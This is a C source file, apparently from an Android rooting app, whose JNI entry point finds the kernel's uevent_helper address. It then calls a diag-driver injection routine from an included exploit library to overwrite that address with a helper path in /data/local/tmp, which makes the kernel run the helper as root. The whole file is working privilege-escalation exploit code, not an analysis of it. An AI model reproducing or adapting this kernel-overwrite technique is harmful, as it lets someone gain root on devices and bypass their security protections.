/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
/*
 * Based on htcj_butterflay_diaggetroot.zip
 * <https://docs.google.com/file/d/0B8LDObFOpzZqQzducmxjRExXNnM/edit?pli=1>
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <jni.h>

#include "libdiagexploit/diag.h"
#include "common.h"

static bool
inject_uevent_helper_with_fd(unsigned int uevent_helper_address,
                             int fd)
{
  struct diag_values data[400];
  int data_length;

  data_length = prepare_injection_data(data, sizeof(data),
                                       uevent_helper_address,
                                       "/data/local/tmp/" HELPER_COMMAND_NAME);

  return diag_inject_with_fd(data, data_length, fd);
}

jboolean
Java_com_example_diaggetroot_MainActivity_getrootnative(JNIEnv *env,
                                                        jobject thiz,
                                                        int fd)
{
  unsigned int uevent_helper_address;
  uevent_helper_address = get_uevent_helper_address();
  if (!uevent_helper_address) {
    return JNI_FALSE;
  }

  return inject_uevent_helper_with_fd(uevent_helper_address, fd);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
